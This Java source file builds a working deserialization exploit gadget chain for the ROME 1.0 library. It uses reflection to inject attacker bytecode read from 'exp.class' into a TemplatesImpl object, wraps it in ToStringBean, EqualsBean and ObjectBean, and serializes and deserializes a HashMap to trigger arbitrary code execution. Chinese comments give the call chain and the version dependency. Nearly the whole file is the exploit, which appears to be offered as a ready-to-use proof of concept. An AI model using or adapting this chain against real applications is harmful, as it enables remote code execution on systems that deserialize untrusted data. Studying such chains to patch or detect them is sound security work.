import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import util.Util;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

/*
* 调用链:
* HashMap.readObject()
*   ObjectBean.hashCode()
*       EqualsBean.beanHashCode()
*           ToStringBean.toString()
*               TemplatesImpl.getOutputProperties()
* */
/*
* 版本依赖:
* rome : 1.0
* */
public class ROME {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(templatesClass,templates);
        EqualsBean equalsBean=new EqualsBean(toStringBean.getClass(),toStringBean);

        ObjectBean objectBean=new ObjectBean(Object.class,new Object());
        Class<?> ObjectBeanClass =Class.forName("com.sun.syndication.feed.impl.ObjectBean");

        Field equalsBeanFiled = ObjectBeanClass.getDeclaredField("_equalsBean");
        equalsBeanFiled.setAccessible(true);
        equalsBeanFiled.set(objectBean,equalsBean);

        HashMap<ObjectBean,String> map =new HashMap<>();
        map.put(objectBean,"dragonkeep");
        Util.serialize(map);
        Util.unserialize();
    }
}
